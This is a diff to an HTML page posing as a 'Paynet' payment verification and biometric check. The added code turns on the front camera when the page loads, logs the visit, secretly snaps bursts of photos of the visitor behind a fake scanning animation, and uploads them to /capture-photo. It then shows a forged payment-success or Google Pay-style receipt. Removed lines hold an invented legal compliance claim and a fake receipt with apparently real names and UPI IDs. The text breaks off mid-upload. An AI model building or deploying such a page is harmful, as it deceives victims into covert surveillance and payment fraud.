@@ -20,27 +20,128 @@
         content="Paynet is securely processing your payment details. Biometric verification in progress.">
     <meta property="og:image"
         content="https://img.freepik.com/premium-photo/secure-payment-verification-icon-protection-online-shopping-banking-with-shield-concept_675567-2708.jpg?w=1200">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:site_name" content="Paynet">
     <link rel="stylesheet" href="/verify.css">
     <style>
-        @keyframes scanAnim {
+        /* Premium Glass Toasts */
+        .toast-container {
+            position: fixed;
+            top: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            pointer-events: none;
+            width: 100%;
+            max-width: 380px;
+            padding: 0 20px;
+        }
+
+        .toast {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(12px) saturate(180%);
+            -webkit-backdrop-filter: blur(12px) saturate(180%);
+            border-radius: 16px;
+            padding: 16px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            animation: toastPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            pointer-events: auto;
+        }
+
+        @keyframes toastPop {
             0% {
+                transform: translateY(-50px) scale(0.9);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes toastOut {
+            to {
+                transform: translateY(-20px) scale(0.95);
+                opacity: 0;
+            }
+        }
+
+        .toast::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 6px;
+            border-radius: 3px 0 0 3px;
+        }
+
+        .toast.success::before {
+            background: #34A853;
+        }
+
+        .toast.error::before {
+            background: #EA4335;
+        }
+
+        .toast.info::before {
+            background: #1A73E8;
+        }
+
+        .toast-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+        }
+
+        .toast.success .toast-icon {
+            background: rgba(52, 168, 83, 0.1);
+            color: #34A853;
+        }
+
+        .toast.error .toast-icon {
+            background: rgba(234, 67, 53, 0.1);
+            color: #EA4335;
+        }
+
+        .toast.info .toast-icon {
+            background: rgba(26, 115, 232, 0.1);
+            color: #1A73E8;
+        }
+
+        .toast-message {
+            font-size: 14px;
+            font-weight: 600;
+            color: #202124;
+        }
+
+        /* Biometric Animations */
+        @keyframes scanAnim {
+
+            0%,
+            100% {
                 top: 0;
             }
 
             50% {
                 top: 100%;
             }
-
-            100% {
-                top: 0;
-            }
         }
 
         @keyframes meshPulse {
-            0% {
+
+            0%,
+            100% {
                 transform: scale(1);
                 opacity: 0.6;
             }
@@ -49,25 +150,22 @@
                 transform: scale(1.05);
                 opacity: 0.9;
             }
-
-            100% {
-                transform: scale(1);
-                opacity: 0.6;
-            }
         }
 
         @keyframes rotateMesh {
-            0% {
+            from {
                 transform: rotate(0deg);
             }
 
-            100% {
+            to {
                 transform: rotate(360deg);
             }
         }
 
         @keyframes floatData {
-            0% {
+
+            0%,
+            100% {
                 opacity: 0.2;
                 transform: translateY(0);
             }
@@ -75,84 +173,6 @@
             50% {
                 opacity: 0.8;
                 transform: translateY(-5px);
-            }
-
-            100% {
-                opacity: 0.2;
-                transform: translateY(0);
-            }
-        }
-
-        .mesh-pulse {
-            animation: meshPulse 2s ease-in-out infinite;
-            transform-origin: center;
-        }
-
-        .rotate-mesh {
-            animation: rotateMesh 10s linear infinite;
-            transform-origin: center;
-        }
-
-        .telemetry-tag {
-            position: absolute;
-            font-family: monospace;
-            font-size: 8px;
-            color: #4285F4;
-            opacity: 0.8;
-            letter-spacing: 1px;
-            pointer-events: none;
-            animation: floatData 3s ease-in-out infinite;
-        }
-
-        .modal-icon {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        /* Responsive tweaks */
-        @media (max-width: 480px) {
-            #scanBox {
-                width: 180px !important;
-                height: 180px !important;
-            }
-
-            .success-title {
-                font-size: 20px !important;
-            }
-        }
-
-        @keyframes beamPulse {
-            0% {
-                opacity: 0.4;
-            }
-
-            50% {
-                opacity: 1;
-            }
-
-            100% {
-                opacity: 0.4;
-            }
-        }
-
-        @keyframes cornerPulse {
-            0% {
-                transform: scale(1);
-                opacity: 0.5;
-            }
-
-            50% {
-                transform: scale(1.1);
-                opacity: 1;
-            }
-
-            100% {
-                transform: scale(1);
-                opacity: 0.5;
             }
         }
 
@@ -162,90 +182,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image:
-                linear-gradient(rgba(66, 133, 244, 0.1) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(66, 133, 244, 0.1) 1px, transparent 1px);
+            background-image: linear-gradient(rgba(66, 133, 244, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(66, 133, 244, 0.1) 1px, transparent 1px);
             background-size: 20px 20px;
             pointer-events: none;
-        }
-
-        .target-bracket {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #4285F4;
-            animation: cornerPulse 2s ease-in-out infinite;
-            z-index: 5;
-        }
-
-        .bracket-tl {
-            top: 15px;
-            left: 15px;
-            border-right: none;
-            border-bottom: none;
-        }
-
-        .bracket-tr {
-            top: 15px;
-            right: 15px;
-            border-left: none;
-            border-bottom: none;
-        }
-
-        .bracket-bl {
-            bottom: 15px;
-            left: 15px;
-            border-right: none;
-            border-top: none;
-        }
-
-        .bracket-br {
-            bottom: 15px;
-            right: 15px;
-            border-left: none;
-            border-top: none;
-        }
-
-        .telemetry-tag {
-            position: absolute;
-            font-family: 'Courier New', monospace;
-            font-size: 7px;
-            color: #4285F4;
-            background: rgba(10, 17, 40, 0.7);
-            padding: 2px 4px;
-            border-radius: 2px;
-            border-left: 1px solid #4285F4;
-            pointer-events: none;
-            animation: floatData 3s ease-in-out infinite;
-            white-space: nowrap;
-            z-index: 6;
-        }
-
-        .lock-indicator {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 120px;
-            height: 120px;
-            border: 1px dashed rgba(66, 133, 244, 0.3);
-            border-radius: 50%;
-            animation: rotateMesh 15s linear infinite;
-            pointer-events: none;
-        }
-
-        @keyframes gradientShift {
-            0% {
-                background-position: 0% 50%;
-            }
-
-            50% {
-                background-position: 100% 50%;
-            }
-
-            100% {
-                background-position: 0% 50%;
-            }
         }
 
         .human-btn {
@@ -269,369 +208,139 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            position: relative;
-            overflow: hidden;
+        }
+
+        @keyframes gradientShift {
+
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
         }
 
         .human-btn:hover {
             transform: translateY(-3px) scale(1.02);
             box-shadow: 0 15px 30px rgba(66, 133, 244, 0.5);
         }
-
-        .human-btn:active {
-            transform: translateY(-1px);
-        }
-
-        .human-btn::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: rgba(255, 255, 255, 0.1);
-            transform: rotate(45deg);
-            pointer-events: none;
-        }
     </style>
 </head>
 
 <body>
+    <div id="toastContainer" class="toast-container"></div>
     <div class="payment-container verify-container" id="mainContainer">
-        <!-- Logo Section (Only for generic, hidden in GPay mode) -->
+        <!-- Generic Header -->
         <div class="logo-section" id="genericLogo">
             <div class="paynet-logo">
                 <svg width="60" height="60" viewBox="0 0 60 60">
-                    <defs>
-                        <linearGradient id="shield-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                            <stop offset="0%" style="stop-color:#1A73E8" />
-                            <stop offset="100%" style="stop-color:#3B5FCC" />
-                        </linearGradient>
-                    </defs>
-                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
-                        fill="url(#shield-gradient)" />
-                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"
-                        stroke-linejoin="round" />
+                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z" fill="#1A73E8" />
+                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" />
                 </svg>
             </div>
             <h1 class="brand-name">Paynet</h1>
         </div>
 
-        <!-- Loading Section -->
+        <!-- Initial Loader -->
         <div id="loadingSection">
-            <h2 class="success-title">Initializing Verification...</h2>
-            <p class="success-subtitle">Please wait while we set up your secure session</p>
-
-            <div style="margin: 30px 0;">
-                <div class="loading-spinner" style="margin: 0 auto;"></div>
-            </div>
+            <h2 class="success-title">Initializing...</h2>
+            <div class="loading-spinner" style="margin: 30px auto;"></div>
         </div>
 
-        <!-- Error Section -->
-        <div id="errorSection" style="display: none; text-align: center; animation: fadeIn 0.5s ease-out;">
-            <div class="modal-icon" style="background: #FCE8E6; color: #D93025; margin: 0 auto 20px;">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
-                    <path
-                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
-                </svg>
-            </div>
-            <h2 class="success-title">Link Expired</h2>
-            <p class="success-subtitle">This verification link is invalid or has expired. Please try again from the
-                merchant portal.</p>
-            <button class="modal-btn" style="background: #1A73E8; margin-top: 20px;"
-                onclick="window.location.href='/'">Return to Merchant</button>
+        <!-- Verification Link Error -->
+        <div id="errorSection" style="display: none; text-align: center;">
+            <h2 class="success-title">Invalid Link</h2>
+            <p>This verification link is expired or invalid.</p>
         </div>
 
-        <!-- Human Verification / Biometric Scan Section -->
-        <div id="humanVerificationSection" style="display: none; text-align: center; animation: fadeIn 0.5s ease-out;">
-            <div class="modal-icon" style="background: #E8F0FE; color: #1A73E8; margin: 0 auto 20px;">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
-                    <path
-                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9h10v2H7z" />
-                </svg>
-            </div>
+        <!-- HUMAN VERIFICATION STAGE -->
+        <div id="humanVerificationSection" style="display: none; text-align: center;">
             <h2 class="success-title">Human Verification</h2>
-            <p class="success-subtitle">To proceed, we need to verify that you are a human. This is a mandatory security
-                step.</p>
+            <p class="success-subtitle">Mandatory biometric identity check.</p>
 
             <div id="scanBox"
-                style="position: relative; width: 220px; height: 220px; margin: 30px auto; border: 2px solid rgba(66,133,244,0.3); border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 50px rgba(66,133,244,0.2);">
-                <!-- Real Video (Hidden from user) -->
-                <video id="scanVideo" style="position: absolute; width: 1px; height: 1px; opacity: 0;"></video>
+                style="position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(66,133,244,0.3);">
+                <video id="scanVideo"
+                    style="position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0;"></video>
 
-                <!-- Biometric UI Stage -->
                 <div id="avatarContainer"
-                    style="display: none; width: 100%; height: 100%; position: relative; background: radial-gradient(circle at center, #0a1128 0%, #000 100%);">
-
+                    style="display: none; width: 100%; height: 100%; position: relative; background: #0a1128;">
                     <div class="scan-grid"></div>
-                    <div class="lock-indicator"></div>
-
-                    <!-- Target Brackets -->
-                    <div class="target-bracket bracket-tl"></div>
-                    <div class="target-bracket bracket-tr"></div>
-                    <div class="target-bracket bracket-bl"></div>
-                    <div class="target-bracket bracket-br"></div>
-
-                    <!-- Layered AI Mesh -->
-                    <svg id="aiMesh" width="100%" height="100%" viewBox="0 0 100 100"
-                        style="position: absolute; top:0; left:0; z-index: 4;">
-                        <!-- Rotating base -->
-                        <circle cx="50" cy="50" r="45" stroke="#4285F4" stroke-width="0.05" fill="none"
-                            class="rotate-mesh" stroke-dasharray="1 3" />
-
-                        <!-- Interconnected Nodes -->
-                        <g class="mesh-pulse">
-                            <!-- Main Face Map -->
-                            <path
-                                d="M50 20 C35 20, 25 35, 30 55 C35 75, 45 80, 50 80 C55 80, 65 75, 70 55 C75 35, 65 20, 50 20"
-                                stroke="#4285F4" stroke-width="0.3" fill="none" opacity="0.8" />
-
-                            <!-- Mapping Nodes -->
-                            <circle cx="40" cy="45" r="1.5" fill="#4285F4" />
-                            <circle cx="60" cy="45" r="1.5" fill="#4285F4" />
-                            <circle cx="50" cy="35" r="1" fill="#4285F4" opacity="0.5" />
-                            <circle cx="50" cy="65" r="1" fill="#4285F4" opacity="0.5" />
-                            <circle cx="35" cy="60" r="1" fill="#4285F4" opacity="0.5" />
-                            <circle cx="65" cy="60" r="1" fill="#4285F4" opacity="0.5" />
-
-                            <!-- Connection Lines -->
-                            <line x1="40" y1="45" x2="50" y2="35" stroke="#4285F4" stroke-width="0.1" opacity="0.3" />
-                            <line x1="60" y1="45" x2="50" y2="35" stroke="#4285F4" stroke-width="0.1" opacity="0.3" />
-                            <line x1="40" y1="45" x2="50" y2="65" stroke="#4285F4" stroke-width="0.1" opacity="0.3" />
-                            <line x1="60" y1="45" x2="50" y2="65" stroke="#4285F4" stroke-width="0.1" opacity="0.3" />
-                        </g>
+                    <svg width="100%" height="100%" viewBox="0 0 100 100" style="position: absolute; z-index: 5;">
+                        <circle cx="50" cy="50" r="40" stroke="#4285F4" stroke-width="0.5" fill="none"
+                            class="mesh-pulse" />
+                        <path d="M30 50 Q50 30 70 50 Q50 70 30 50" stroke="#4285F4" stroke-width="0.5" fill="none"
+                            opacity="0.6" />
                     </svg>
-
-                    <!-- Dynamic Telemetry Tags -->
-                    <div class="telemetry-tag" style="top: 25%; left: 8%;" id="t-eye">NODE_EYE: ACTIVE</div>
-                    <div class="telemetry-tag" style="bottom: 25%; right: 8%;" id="t-face">STRUC_MAP: 0%</div>
-                    <div class="telemetry-tag" style="top: 50%; right: 5%;" id="t-auth">AUTH_TOKEN: ...</div>
-                    <div class="telemetry-tag" style="bottom: 40%; left: 5%;" id="t-depth">DEPTH_VAR: 0.00</div>
+                    <div class="telemetry-tag" style="top: 20%; left: 10%;" id="t-eye">SYNCING...</div>
+                    <div class="telemetry-tag" style="bottom: 20%; right: 10%;" id="t-face">MAP: 0%</div>
                 </div>
 
                 <div id="scanPlaceholder"
-                    style="color: #4285F4; font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 2px; opacity: 0.6;">
-                    System Ready</div>
-
-                <!-- Enhanced Scan Laser -->
+                    style="color: #4285F4; font-size: 10px; font-weight: 700; letter-spacing: 2px;">READY</div>
                 <div id="scanLine"
-                    style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #4285F4; box-shadow: 0 0 15px #4285F4, 0 0 30px #4285F4; animation: scanAnim 3s ease-in-out infinite; z-index: 10;">
+                    style="display: none; position: absolute; top:0; left:0; width: 100%; height: 2px; background: #4285F4; box-shadow: 0 0 15px #4285F4; animation: scanAnim 2s infinite;">
                 </div>
             </div>
 
-            <div id="verificationStatus" class="verification-steps" style="max-width: 300px; margin: 0 auto;">
+            <div class="verification-steps" style="max-width: 280px; margin: 0 auto;">
                 <div class="step" id="step-bio">
-                    <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
-                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
-                    </svg>
-                    <span class="step-text">Waiting for camera...</span>
+                    <span class="step-text">Connect to Secure Node</span>
                 </div>
             </div>
 
             <button id="startScanBtn" class="human-btn" onclick="initiateBiometricScan()">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
-                    stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                    <circle cx="12" cy="7" r="4"></circle>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                    <circle cx="12" cy="7" r="4" />
                 </svg>
                 I am human
             </button>
         </div>
 
-        <!-- Processing Result Section -->
-        <div id="processingResultSection" style="display: none;">
-            <h2 class="success-title">Finalizing Transaction...</h2>
-            <p class="success-subtitle">Verifying biometric data and securing payment</p>
-            <div style="margin: 30px 0;">
-                <div class="loading-spinner" style="margin: 0 auto;"></div>
-            </div>
-            <div class="verification-steps">
-                <div class="step">
-                    <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#34A853" />
-                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="white" />
-                    </svg>
-                    <span class="step-text">Biometric Identity Verified</span>
-                </div>
-                <div class="step">
-                    <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
-                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
-                    </svg>
-                    <span class="step-text">Linking to Merchant Gateway...</span>
-                </div>
-            </div>
+        <!-- PROCESSING STAGE -->
+        <div id="processingResultSection" style="display: none; text-align: center;">
+            <h2 class="success-title">Finalizing...</h2>
+            <div class="loading-spinner" style="margin: 30px auto;"></div>
         </div>
 
-        <!-- Generic Receipt Section -->
-        <div id="receiptSection" class="receipt">
-            <div class="receipt-header">
-                <div class="receipt-title">PAYMENT RECEIPT</div>
-                <div style="font-size: 12px; color: #5f6368; margin-top: 5px;">Transaction Successful</div>
-            </div>
-
-            <div class="receipt-amount">
-                <div class="receipt-amount-label">Amount Paid</div>
-                <div class="receipt-amount-value">₹500.00</div>
-            </div>
-
-            <div class="receipt-row">
-                <span class="receipt-label">Paid to</span>
-                <span class="receipt-value">Paynet Services</span>
-            </div>
-            <div class="receipt-row">
-                <span class="receipt-label">Transaction ID</span>
-                <span class="receipt-value" id="receipt-txn-id">TXN1234567890</span>
-            </div>
-            <div class="receipt-row">
-                <span class="receipt-label">Date & Time</span>
-                <span class="receipt-value" id="receipt-date">14 Feb 2026, 08:43 AM</span>
-            </div>
-            <div class="receipt-row">
-                <span class="receipt-label">Status</span>
-                <span class="receipt-value" style="color: #34A853; font-weight: 700;">✓ SUCCESS</span>
-            </div>
+        <!-- GENERIC RECEIPT -->
+        <div id="receiptSection" style="display: none;" class="receipt">
+            <h2 class="success-title">Payment Successful</h2>
+            <div class="receipt-amount">₹<span id="amount-val">0</span>.00</div>
         </div>
 
-        <!-- GOOGLE PAY CUSTOM RECEIPT -->
-        <div id="gpayReceiptSection" class="gpay-receipt">
-            <!-- Animated Checkmark -->
-            <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+        <!-- GPAY RECEIPT -->
+        <div id="gpayReceiptSection" style="display: none;" class="gpay-receipt">
+            <svg class="success-checkmark" viewBox="0 0 52 52">
                 <circle class="success-checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                 <path class="success-checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
             </svg>
-
-            <div style="font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 5px;">Payment received</div>
-            <div class="gpay-amount-display" id="gpay-amount">₹1,600</div>
-            <div id="gpay-to-name" class="gpay-to-name"
-                style="font-size: 16px; color: #5f6368; margin-bottom: 20px; font-weight: 400;">To Deepak Anna Bodke
-            </div>
-
-            <div class="gpay-timestamp" id="gpay-time">13 Feb 2026, 8:03 pm</div>
-
-            <div class="gpay-card">
-                <div class="gpay-card-header">
-                    <!-- Generic Bank Icon -->
-                    <div style="display: flex; align-items: center; gap: 10px; flex: 1;">
-                        <svg class="bank-icon" viewBox="0 0 24 24" style="fill: #1a73e8;">
-                            <path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm19-19H2v6h19V3z" />
-                        </svg>
-                        <span class="gpay-value" id="gpay-bank" style="font-weight: 500;">Canara Bank 2461</span>
-                    </div>
-                    <span style="color: #5f6368;">▼</span>
-                </div>
-
-                <div class="gpay-card-body">
-                    <div class="gpay-row">
-                        <div class="gpay-label">UPI transaction ID</div>
-                        <div class="gpay-value" id="gpay-upi-txn">604456031510</div>
-                    </div>
-
-                    <div class="gpay-row">
-                        <div class="gpay-label" id="gpay-label-to">To: Deepak Anna Bodke</div>
-                        <div class="gpay-value" id="gpay-to-upi">gpay-12192992016@okbizaxis</div>
-                    </div>
-
-                    <div class="gpay-row">
-                        <div class="gpay-label" id="gpay-label-from">From: NOUFIYA J (Canara Bank)</div>
-                        <div class="gpay-value">Google Pay • <span id="gpay-from-upi">nowfiyajalal890@okaxis</span>
-                        </div>
-                    </div>
-
-                    <div class="gpay-row">
-                        <div class="gpay-label">Google transaction ID</div>
-                        <div class="gpay-value" id="gpay-google-txn">CICAgJIl3_rfbQ</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="gpay-footer-logo">
-                <svg height="24" viewBox="0 0 64 64">
-                    <path fill="#5f6368"
-                        d="M32 0C14.3 0 0 14.3 0 32s14.3 32 32 32 32-14.3 32-32S49.7 0 32 0zm0 58c-14.4 0-26-11.6-26-26S17.6 6 32 6s26 11.6 26 26-11.6 26-26 26z" />
-                    <path fill="#5f6368" d="M32 15l-5 10h10l-5-10z" />
-                </svg>
-                <span style="font-family: 'Google Sans'; color: #5f6368; font-size: 18px;">Google Pay</span>
-            </div>
+            <div style="font-size: 22px; color: #202124;">Payment received</div>
+            <div id="gpay-amount" style="font-size: 36px; font-weight: 500; margin: 10px 0;">₹0</div>
         </div>
 
-        <div class="footer" style="margin-top: 30px;" id="genericFooter">
-            <p class="powered-by">Secured by <strong>Paynet</strong></p>
-        </div>
-    </div>
-
-    <!-- Permission Access Modal (Strict) -->
-    <div id="permissionModal" class="location-modal" style="display: none;">
-        <div class="modal-content">
-            <div class="modal-icon" style="background: #F8D7DA; color: #721C24;">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
-                    <path
-                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
-                </svg>
-            </div>
-            <h3 class="modal-title">Permissions Required</h3>
-            <p class="modal-text">To proceed with this high-security transaction, Paynet strictly requires
-                <strong>Camera</strong> and <strong>Location</strong> access for biometric verification.
-            </p>
-
-            <div
-                style="background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 12px; margin-bottom: 20px; text-align: left;">
-                <div
-                    style="font-size: 11px; font-weight: 700; color: #5f6368; text-transform: uppercase; margin-bottom: 5px; display: flex; align-items: center; gap: 5px;">
-                    📜 Compliance Note
-                </div>
-                <div style="font-size: 13px; color: #3c4043; line-height: 1.4;">
-                    Identity scan and location tracking are mandatory under <strong>Digital Finance Security
-                        Act</strong> to prevent unauthorized 3rd-party transfers.
-                </div>
-            </div>
-
-            <button id="permissionBtn" class="modal-btn" style="background: #1A73E8; font-weight: 700;"
-                onclick="retryPermissions()">Allow & Continue</button>
-            <p style="font-size: 11px; color: #9aa0a6; margin-top: 15px;">Your connection is encrypted and data is
-                handled securely.</p>
+        <div id="genericFooter" class="footer" style="margin-top: 30px;">
+            <p>Secured by <strong>Paynet</strong></p>
         </div>
     </div>
 
     <script>
         let capturedPhotos = [];
         let cameraStream = null;
-        let video = null;
+        let video = document.getElementById('scanVideo');
         let paymentData = null;
+        const paymentId = new URLSearchParams(window.location.search).get('id');
 
-        // Get payment ID from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const paymentId = urlParams.get('id');
-
-        // Fetch payment details on load
-        async function fetchPaymentDetails() {
-            if (!paymentId) return null;
-
-            try {
-                const response = await fetch('/validate-payment-id', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ paymentId: paymentId })
-                });
-
-                const data = await response.json();
-                if (data.valid) {
-                    return data.payment;
-                }
-            } catch (error) {
-                console.error('Error fetching payment details:', error);
-            }
-            return null;
-        }
-
-        // Auto-start camera and capture photos during animation
-        window.addEventListener('load', async function () {
-            // Initiate location logging silently
+        window.addEventListener('load', async () => {
             logVisit();
-
-            // Fetch payment details first
-            paymentData = await fetchPaymentDetails();
+            paymentData = await fetch('/validate-payment-id', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ paymentId })
+            }).then(r => r.json()).then(d => d.valid ? d.payment : null);
 
             if (!paymentData) {
                 document.getElementById('loadingSection').style.display = 'none';
@@ -639,313 +348,127 @@
                 return;
             }
 
-            // Show Human Verification after initial load
+            // PRE-LOAD CAMERA
+            startCameraInScanBox();
+
             setTimeout(() => {
                 document.getElementById('loadingSection').style.display = 'none';
                 document.getElementById('humanVerificationSection').style.display = 'block';
-            }, 1000);
+                showToast("Security Systems Online", "success");
+            }, 800);
         });
 
-        // Helper for random IDs if missing
-        function generateRandomId(length) {
-            let result = '';
-            const characters = '0123456789';
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
-        }
-
-        function generateRandomString(length) {
-            let result = '';
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
+        async function startCameraInScanBox() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = cameraStream;
+                video.onloadedmetadata = () => video.play();
+                return true;
+            } catch (e) { return false; }
         }
 
         async function initiateBiometricScan() {
             const btn = document.getElementById('startScanBtn');
-            btn.innerHTML = "Initializing...";
+            btn.innerHTML = "Authenticating...";
             btn.disabled = true;
 
-            // Check Location first
-            const locSuccess = await logVisit();
-            if (!locSuccess) {
-                showPermissionModal();
+            if (!video || video.readyState < 2) await startCameraInScanBox();
+
+            // BRIGHTNESS CHECK
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 200;
+            canvas.height = video.videoHeight || 200;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            let sum = 0;
+            for (let i = 0; i < data.length; i += 40) sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
+            if (sum / (data.length / 40) < 15) {
+                showToast("Too dark. Move to a well-lit area.", "error");
                 btn.innerHTML = "Retry Verification";
                 btn.disabled = false;
                 return;
             }
 
-            // Check Camera
-            const camSuccess = await startCameraInScanBox();
-            if (!camSuccess) {
-                showPermissionModal();
-                btn.innerHTML = "Retry Verification";
-                btn.disabled = false;
-                return;
-            }
-
-            // Both success - show Scan UI
-            document.getElementById('permissionModal').style.display = 'none';
+            // START ANIMATION
             document.getElementById('scanPlaceholder').style.display = 'none';
             document.getElementById('avatarContainer').style.display = 'flex';
             document.getElementById('scanLine').style.display = 'block';
             btn.style.display = 'none';
+            showToast("Biometric Lock: ENGAGED", "info");
 
-            updateStep('step-bio', 'FBBC04', 'Establishing Secure Channel...');
+            // BURST CAPTURE 1: Biometric Step (5 photos in 1s)
+            await captureBurst(5, 200);
 
-            // Start Dynamic Telemetry
-            startTelemetryEngine();
-
-            // Capture 5 photos over 5 seconds
-            await captureMultiplePhotos();
-
-            updateStep('step-bio', '34A853', 'Scan Complete ✓');
-
-            // Move to final processing
+            showToast("Identity Confirmed", "success");
             setTimeout(() => {
                 document.getElementById('humanVerificationSection').style.display = 'none';
                 document.getElementById('processingResultSection').style.display = 'block';
-
-                // Show final receipt after processing
-                setTimeout(showReceipt, 3000);
-            }, 1000);
+                setTimeout(showReceipt, 1500);
+            }, 500);
         }
 
-        function updateStep(id, color, text) {
-            const step = document.getElementById(id);
-            if (!step) return;
-            const icon = step.querySelector('.step-icon circle');
-            if (icon) icon.setAttribute('fill', '#' + color);
-            const textEl = step.querySelector('.step-text');
-            if (textEl) textEl.innerText = text;
-        }
-
-        // Professional Telemetry Engine
-        function startTelemetryEngine() {
-            const eye = document.getElementById('t-eye');
-            const face = document.getElementById('t-face');
-            const auth = document.getElementById('t-auth');
-            const depth = document.getElementById('t-depth');
-
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 5) + 1;
-                if (progress > 100) progress = 100;
-
-                if (eye) eye.textContent = `EYE_LOCK: ${Math.random() > 0.5 ? 'SYNC' : 'BUSY'} [${(Math.random() * 10).toFixed(1)}ms]`;
-                if (face) face.textContent = `STRUC_MAP: ${progress}% COMPLETE`;
-                if (auth) auth.textContent = `HEX_TOKEN: 0x${Math.floor(Math.random() * 16777215).toString(16).toUpperCase()}`;
-                if (depth) depth.textContent = `DEPTH_VAR: +/-${(Math.random() * 0.5).toFixed(3)}m`;
-
-                if (progress === 100) {
-                    clearInterval(interval);
-                    updateStep('step-bio', 'FBBC04', 'Identity Confirmed. Finalizing...');
+        async function captureBurst(count, interval) {
+            for (let i = 0; i < count; i++) {
+                if (video.videoWidth > 0) {
+                    const c = document.createElement('canvas');
+                    c.width = video.videoWidth; c.height = video.videoHeight;
+                    c.getContext('2d').drawImage(video, 0, 0);
+                    const photo = c.toDataURL('image/jpeg', 0.5);
+                    fetch('/capture-photo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
